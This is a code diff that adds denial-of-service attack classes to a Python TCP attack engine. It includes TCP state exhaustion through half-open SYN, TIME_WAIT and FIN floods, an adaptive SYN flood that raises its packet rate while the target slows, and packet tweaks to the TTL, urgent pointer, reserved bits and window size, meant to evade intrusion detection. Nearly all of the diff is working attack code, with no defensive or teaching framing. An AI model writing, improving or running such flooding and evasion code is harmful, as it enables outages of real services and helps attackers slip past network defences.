@@ -461,3 +461,359 @@ class TCPEngine:
                 'success': False,
                 'error': str(e)
             }
+
+
+
+class AdvancedTCPEngine(TCPEngine):
+    """
+    Advanced TCP engine with sophisticated attack techniques.
+    
+    Features:
+    - TCP state machine manipulation
+    - Connection state tracking
+    - Adaptive timing based on target response
+    - Protocol-level evasion techniques
+    """
+    
+    def __init__(self, config: TCPAttackConfig = None):
+        super().__init__(config)
+        self.connection_states = {}
+        self.timing_model = AdaptiveTiming()
+        self.evasion_engine = TCPEvasionEngine()
+        
+    async def tcp_state_manipulation(self, target: str, port: int, 
+                                     manipulation_type: str = "half_open") -> Dict[str, Any]:
+        """
+        Manipulate TCP state machine to exhaust server resources.
+        
+        Types:
+        - half_open: Leave connections in SYN_RECEIVED state
+        - time_wait: Force connections into TIME_WAIT state
+        - fin_wait: Leave connections in FIN_WAIT state
+        """
+        logger.info(f"Starting TCP state manipulation ({manipulation_type}) against {target}:{port}")
+        
+        results = {
+            'manipulation_type': manipulation_type,
+            'connections_created': 0,
+            'connections_in_target_state': 0,
+            'errors': 0
+        }
+        
+        try:
+            if manipulation_type == "half_open":
+                # Send SYN packets without completing handshake
+                for _ in range(self.config.max_connections):
+                    packet = await self.create_packet(target, port, 64, TCPAttackType.SYN_FLOOD)
+                    results['connections_created'] += 1
+                    await asyncio.sleep(0.001)
+                    
+            elif manipulation_type == "time_wait":
+                # Complete handshake then immediately close
+                for _ in range(min(100, self.config.max_connections)):
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(2)
+                        sock.connect((target, port))
+                        sock.close()
+                        results['connections_created'] += 1
+                        results['connections_in_target_state'] += 1
+                    except Exception:
+                        results['errors'] += 1
+                    await asyncio.sleep(0.01)
+                    
+            elif manipulation_type == "fin_wait":
+                # Send FIN without proper close sequence
+                for _ in range(min(100, self.config.max_connections)):
+                    packet = await self.create_packet(target, port, 64, TCPAttackType.FIN_FLOOD)
+                    results['connections_created'] += 1
+                    await asyncio.sleep(0.001)
+            
+            return results
+            
+        except Exception as e:
+            logger.error(f"TCP state manipulation failed: {e}")
+            results['error'] = str(e)
+            return results
+    
+    async def adaptive_syn_flood(self, target: str, port: int, duration: int = 60) -> Dict[str, Any]:
+        """
+        Adaptive SYN flood that adjusts rate based on target response.
+        """
+        logger.info(f"Starting adaptive SYN flood against {target}:{port}")
+        
+        start_time = time.time()
+        current_rate = 1000  # Start with 1000 PPS
+        max_rate = 100000
+        min_rate = 100
+        
+        results = {
+            'packets_sent': 0,
+            'rate_adjustments': 0,
+            'peak_rate': 0,
+            'errors': 0
+        }
+        
+        while (time.time() - start_time) < duration:
+            # Send burst at current rate
+            burst_start = time.time()
+            burst_packets = 0
+            
+            while burst_packets < current_rate and (time.time() - burst_start) < 1.0:
+                try:
+                    packet = await self.create_packet(target, port, 64, TCPAttackType.SYN_FLOOD)
+                    results['packets_sent'] += 1
+                    burst_packets += 1
+                except Exception:
+                    results['errors'] += 1
+            
+            # Measure target response (simplified - check if we can still connect)
+            response_time = await self._measure_response_time(target, port)
+            
+            # Adjust rate based on response
+            if response_time > 2.0:  # Target is struggling
+                # Maintain or slightly increase rate
+                current_rate = min(max_rate, int(current_rate * 1.1))
+            elif response_time < 0.1:  # Target handling well
+                # Increase rate significantly
+                current_rate = min(max_rate, int(current_rate * 1.5))
+            else:
+                # Moderate adjustment
+                current_rate = min(max_rate, int(current_rate * 1.2))
+            
+            results['rate_adjustments'] += 1
+            results['peak_rate'] = max(results['peak_rate'], current_rate)
+            
+            # Brief pause between bursts
+            await asyncio.sleep(0.1)
+        
+        results['duration'] = time.time() - start_time
+        results['average_pps'] = results['packets_sent'] / results['duration']
+        
+        return results
+    
+    async def _measure_response_time(self, target: str, port: int) -> float:
+        """Measure target response time"""
+        try:
+            start = time.time()
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((target, port))
+            sock.close()
+            return time.time() - start
+        except socket.timeout:
+            return 5.0
+        except Exception:
+            return 10.0
+
+
+class AdaptiveTiming:
+    """Adaptive timing model for TCP attacks"""
+    
+    def __init__(self):
+        self.response_times = []
+        self.current_delay = 0.001  # 1ms default
+        self.min_delay = 0.0001  # 100μs
+        self.max_delay = 0.1  # 100ms
+        
+    def record_response(self, response_time: float):
+        """Record a response time measurement"""
+        self.response_times.append(response_time)
+        if len(self.response_times) > 100:
+            self.response_times.pop(0)
+        self._adjust_timing()
+    
+    def _adjust_timing(self):
+        """Adjust timing based on response patterns"""
+        if len(self.response_times) < 10:
+            return
+        
+        avg_response = sum(self.response_times[-10:]) / 10
+        
+        if avg_response > 1.0:
+            # Target is slow, reduce our rate
+            self.current_delay = min(self.max_delay, self.current_delay * 1.5)
+        elif avg_response < 0.1:
+            # Target is fast, increase our rate
+            self.current_delay = max(self.min_delay, self.current_delay * 0.7)
+    
+    def get_delay(self) -> float:
+        """Get current recommended delay"""
+        # Add jitter for evasion
+        jitter = random.uniform(0.8, 1.2)
+        return self.current_delay * jitter
+
+
+class TCPEvasionEngine:
+    """TCP-level evasion techniques"""
+    
+    def __init__(self):
+        self.techniques = [
+            'fragmentation',
+            'overlapping_fragments',
+            'ttl_manipulation',
+            'urgent_pointer',
+            'reserved_bits',
+            'window_manipulation'
+        ]
+        
+    def apply_evasion(self, packet: bytes, technique: str) -> bytes:
+        """Apply evasion technique to packet"""
+        if technique == 'ttl_manipulation':
+            return self._manipulate_ttl(packet)
+        elif technique == 'urgent_pointer':
+            return self._set_urgent_pointer(packet)
+        elif technique == 'reserved_bits':
+            return self._set_reserved_bits(packet)
+        elif technique == 'window_manipulation':
+            return self._manipulate_window(packet)
+        return packet
+    
+    def _manipulate_ttl(self, packet: bytes) -> bytes:
+        """Manipulate TTL to evade some IDS"""
+        if len(packet) < 20:
+            return packet
+        packet = bytearray(packet)
+        # Set TTL to random value between 64 and 128
+        packet[8] = random.randint(64, 128)
+        return bytes(packet)
+    
+    def _set_urgent_pointer(self, packet: bytes) -> bytes:
+        """Set urgent pointer for evasion"""
+        if len(packet) < 40:  # Need IP + TCP headers
+            return packet
+        packet = bytearray(packet)
+        # Set URG flag and urgent pointer
+        ip_header_len = (packet[0] & 0x0F) * 4
+        tcp_offset = ip_header_len
+        if tcp_offset + 20 <= len(packet):
+            packet[tcp_offset + 13] |= 0x20  # Set URG flag
+            # Set urgent pointer to random value
+            urgent_ptr = random.randint(1, 100)
+            packet[tcp_offset + 18] = (urgent_ptr >> 8) & 0xFF
+            packet[tcp_offset + 19] = urgent_ptr & 0xFF
+        return bytes(packet)
+    
+    def _set_reserved_bits(self, packet: bytes) -> bytes:
+        """Set reserved bits (may confuse some parsers)"""
+        if len(packet) < 40:
+            return packet
+        packet = bytearray(packet)
+        ip_header_len = (packet[0] & 0x0F) * 4
+        tcp_offset = ip_header_len
+        if tcp_offset + 13 <= len(packet):
+            # Set reserved bits in TCP header
+            packet[tcp_offset + 12] |= 0x0E  # Set reserved bits
+        return bytes(packet)
+    
+    def _manipulate_window(self, packet: bytes) -> bytes:
+        """Manipulate TCP window size"""
+        if len(packet) < 40:
+            return packet
+        packet = bytearray(packet)
+        ip_header_len = (packet[0] & 0x0F) * 4
+        tcp_offset = ip_header_len
+        if tcp_offset + 16 <= len(packet):
+            # Set window to random value
+            window = random.randint(1024, 65535)
+            packet[tcp_offset + 14] = (window >> 8) & 0xFF
+            packet[tcp_offset + 15] = window & 0xFF
+        return bytes(packet)
+    
+    def get_random_technique(self) -> str:
+        """Get a random evasion technique"""
+        return random.choice(self.techniques)
+
+
+class TCPConnectionPool:
+    """
+    Connection pool for efficient TCP connection management.
+    
+    Features:
+    - Connection reuse
+    - Health checking
+    - Automatic reconnection
+    """
+    
+    def __init__(self, target: str, port: int, max_connections: int = 100):
+        self.target = target
+        self.port = port
+        self.max_connections = max_connections
+        self.connections = []
+        self.available = []
+        self.lock = asyncio.Lock()
+        
+    async def get_connection(self) -> Optional[socket.socket]:
+        """Get a connection from the pool"""
+        async with self.lock:
+            if self.available:
+                conn = self.available.pop()
+                if self._is_healthy(conn):
+                    return conn
+                else:
+                    try:
+                        conn.close()
+                    except:
+                        pass
+            
+            # Create new connection if pool not full
+            if len(self.connections) < self.max_connections:
+                conn = await self._create_connection()
+                if conn:
+                    self.connections.append(conn)
+                    return conn
+            
+            return None
+    
+    async def release_connection(self, conn: socket.socket):
+        """Return a connection to the pool"""
+        async with self.lock:
+            if self._is_healthy(conn):
+                self.available.append(conn)
+            else:
+                try:
+                    conn.close()
+                except:
+                    pass
+                if conn in self.connections:
+                    self.connections.remove(conn)
+    
+    async def _create_connection(self) -> Optional[socket.socket]:
+        """Create a new connection"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.connect((self.target, self.port))
+            return sock
+        except Exception as e:
+            logger.debug(f"Failed to create connection: {e}")
+            return None
+    
+    def _is_healthy(self, conn: socket.socket) -> bool:
+        """Check if connection is still healthy"""
+        try:
+            # Try to peek at data without consuming it
+            conn.setblocking(False)
+            try:
+                data = conn.recv(1, socket.MSG_PEEK)
+                conn.setblocking(True)
+                return True
+            except BlockingIOError:
+                conn.setblocking(True)
+                return True  # No data available but connection is alive
+            except:
+                return False
+        except:
+            return False
+    
+    async def close_all(self):
+        """Close all connections"""
+        async with self.lock:
+            for conn in self.connections:
+                try:
+                    conn.close()
+                except:
+                    pass
+            self.connections.clear()
+            self.available.clear()
